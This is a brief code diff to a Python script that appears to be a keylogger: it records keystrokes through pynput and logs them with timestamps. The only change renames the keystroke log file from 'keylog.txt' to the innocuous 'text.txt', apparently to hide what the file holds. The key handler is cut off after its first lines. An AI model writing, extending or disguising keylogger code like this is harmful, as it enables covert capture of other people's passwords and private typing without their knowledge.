@@ -4,7 +4,7 @@ from pynput import keyboard
 import logging
 
 
-logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')
+logging.basicConfig(filename="text.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 def on_press(key):
     try:
